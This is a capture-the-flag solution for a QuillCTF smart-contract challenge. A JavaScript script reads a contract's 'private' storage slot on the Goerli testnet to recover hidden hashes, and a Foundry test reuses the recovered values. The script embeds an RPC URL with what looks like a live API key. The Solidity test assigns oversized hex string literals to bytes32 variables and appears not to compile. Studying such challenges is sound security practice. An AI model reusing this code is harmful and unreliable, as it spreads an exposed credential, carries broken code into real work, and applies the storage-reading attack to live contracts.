Disclaimer: Not able to upload multiple files so added both files same file

confidentialhash.js

/* Private variables are not visible only for the contracts, but it is stored on the blockchain, so it is visible

Attack steps:
1) To find slot number use this command

slither-read-storage quillctf2.sol 0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66 data --rpc-url $RPC_URL --variable-name aliceHash

2)Now,  Run this file with the slot number and contract address 
3) you can find the hash
*/

const {ethers,utils } = require("ethers");
const rpc_url = "https://eth-goerli.g.alchemy.com/v2/QnOr41PK7tlqn5XGaNsumbQ3CYD49qd_" //add your rpc_url here
const provider = new ethers.providers.JsonRpcProvider(rpc_url)

async function start() {
  const contract_address = "0xf8e9327e38ceb39b1ec3d26f5fad09e426888e66" //add contract address here
  const slot = 2 // add the storage slot of contract you want to access
  const data = await provider.getStorageAt(contract_address, slot) 
  console.log("Private Data :", data)
}

start()










/* =========================================================================================================================================================*/
import "../src/quillctf2.sol";
import "forge-std/Test.sol";

/* 

1) First run the confidentialhash.js and get all the values
2) Now run this script and check the hash value

*/


contract Quillctf2test is Test{

    Confidential confidential = new Confidential();
   
    bytes32 alice_private_key="0x0000000000000000000000000000000000000000000000000000000000000000";
    bytes32 bob_private_key="0x0000000000000000000000000000000000000000000000000000000000000000";

    bytes32 alice_data=confidential.ALICE_DATA();
    bytes32 bob_data=confidential.BOB_DATA();

//Obtained from the previous script
    bytes32 correctAliceHash = "0x9371C02EEFBD06113FB7E1CE6D27C3C7F6C8FC4D1B5F5F6B2620CD04D1610E3F";
    bytes32 correctBobHash = "0x23884AE3F28BA61FA99F4875E67F11B7C95E1F490CDF5F362C088E4FFABA0855";
    function testReadPrivateVariables() public {

        bytes32 alicehash= confidential.hash(alice_private_key, alice_data);  
        confidential.checkthehash(alicehash);
        assertEq(alicehash,correctAliceHash);

        bytes32 bobhash= confidential.hash(bob_private_key, bob_data);
        confidential.checkthehash(bobhash);
        assertEq(bobhash,correctBobHash);
        
        bytes32 finalhash= confidential.hash(correctAliceHash,correctBobHash);
        
        bytes32 check_the_hash= confidential.checkthehash(finalhash);
    }
    
}
